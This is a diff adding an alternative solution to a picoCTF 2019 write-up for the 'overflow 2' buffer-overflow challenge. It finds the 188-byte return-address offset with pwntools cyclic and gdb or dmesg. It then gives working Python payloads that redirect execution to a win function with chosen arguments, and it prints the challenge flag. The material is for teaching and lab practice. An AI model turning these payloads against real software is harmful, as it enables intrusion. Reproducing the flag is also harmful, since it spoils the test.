@@ -290,3 +290,60 @@ Also works.
 ## Flag
 
 `picoCTF{arg5_and_r3turn51b106031}`
+
+## Alternative Solution - PwnTools
+
+To recap, `vuln` allocates a buffer of size `176` on the stack and then uses `gets` a vulnerable function to read from it.
+
+The first step is to calculate the amount of padding required from the beginning of the buffer all the way to the return address on the stack.
+
+A more detailed explanation can be found on Overflow 1 for the Pwntools cyclic module.
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
+... <redacted>
+Reading symbols from ./vuln...(no debugging symbols found)...done.
+Starting program: /problems/overflow-2/vuln < <(cyclic 200)
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x62616177 in ?? ()
+```
+
+Let's find the offset for those hex values.
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-2$ cyclic -l 0x62616177
+188
+```
+
+So remember the stack grows from the EBP, so our first and second arguments are between `#1-#4`. However, the code seems to be looking at `ebp+8` so let's send `4 A's` before our arguments.
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-2$ python -c 'print "A"*188+"\xe6\x85\x04\x08"+"A"*4+"\xef\xbe\xad\xde"+"\x0d\xd0\xde\xc0"' | ./vuln
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
+```
+
+```bash
+samson@pico-2019-shell1:/problems/overflow-2$ python -c "from pwn import *; print('A'*188 + p32(0x080485e6) + 'A'*4 + p32(0xDEADBEEF) + p32(0xC0DED00D))" | ./vuln
+Please enter your string: 
+���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
+```
+
+## Alternative without GDB
+
+```bash
+$ cyclic 200 | ./vuln
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
+
+$ dmesg | grep vuln
+[123123] vuln[3738]: segfault at 62616177 ip 0000000062616177 sp 00000000ffde7fe0 error 14 in libc-2.27.so[f7d1b000+19000]
+
+$ cyclic -l 0x62616177
+188
+```
